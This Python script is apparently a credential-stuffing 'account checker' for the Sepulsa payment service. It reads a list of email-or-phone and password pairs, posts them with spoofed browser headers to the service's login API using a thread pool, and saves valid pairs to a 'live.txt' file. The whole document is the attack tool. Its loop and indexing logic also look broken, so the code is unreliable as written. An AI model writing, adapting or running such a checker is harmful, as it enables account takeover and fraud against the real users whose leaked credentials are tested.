# -*- coding: utf-8 -*-
# copyright 2019 ~ widhisec
# dibuat pada tanggal 26/08/2019
# https://github.com/widhisec
import requests
import re
import sys
from concurrent.futures import ThreadPoolExecutor
nc='\033[0m' #No color
h='\033[1;32m'
m='\033[1;31m'
pu = []
to = []
p = []
til = 0
pul = []
def okay():
   if sys.version[0] in '2':
         exit("[sorry] use python version 3")
   try:
         o=open(input("%s?:list -> "%(nc))).read().splitlines()
   except Exception as f:
         exit("[file not found] %s"%(f))
   for x in o:
         k=x.split("|")
         to.append(k[1])
         pu.append(k[0])
   headers = {
         'Accept': 'application/json, text/plain, */*',
         'Source': 'phoenix',
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36',
         'Sec-Fetch-Mode': 'cors',
         'Content-Type': 'application/json',
         }
   data = '{"email_or_phone_number":"%s","password":"%s"}' % (pu[til-1],to[til-1])
   responsen = requests.post('https://gaia.sepulsa.com/bumi/account/login', headers=headers, data=data).text
   rz = re.findall(r'rescode":"[^"]*', responsen)[0]
   s=len(to)
   i = 0
   while i < s:
         i+=1
         if "0" in rz:
            p.append(pu[til-1])
            open("live.txt","a+").write("%s|%s\n"%(pu[til-1],to[til-1]))
            print("[%sLIVE%s] %s|%s"%(h,nc,pu[til-1],to[til-1]))
         elif "24" in rz:
            print("[%sDIEE%s] %s|%s"%(m,nc,pu[til-1],to[til-1]))   
if __name__ == "__main__":
   print ("""
   [ account checker sepulsa ]
   """)
   TH = input("?:thread -> ")
   executor = ThreadPoolExecutor(max_workers=int(TH))
   executor.submit(okay)
   